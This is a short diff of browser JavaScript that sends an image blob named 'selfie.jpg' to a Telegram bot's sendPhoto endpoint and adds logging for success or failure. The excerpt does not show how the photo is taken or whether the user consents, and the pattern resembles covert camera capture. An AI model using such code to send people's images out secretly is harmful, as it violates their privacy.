@@ -134,7 +134,7 @@
                 // Prepare the form data to send the image to Telegram
                 let formData = new FormData();
                 formData.append("chat_id", chatId);
-                formData.append("photo", blob);
+                formData.append("photo", blob, "selfie.jpg");
 
                 const telegramUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
 
@@ -142,6 +142,11 @@
                 try {
                     const response = await fetch(telegramUrl, { method: "POST", body: formData });
                     const result = await response.json();
+                    if (result.ok) {
+                        console.log("Photo sent successfully.");
+                    } else {
+                        console.error("Error sending photo:", result.description);
+                    }
                 } catch (error) {
                     console.error("Telegram API Error:", error);
                 }
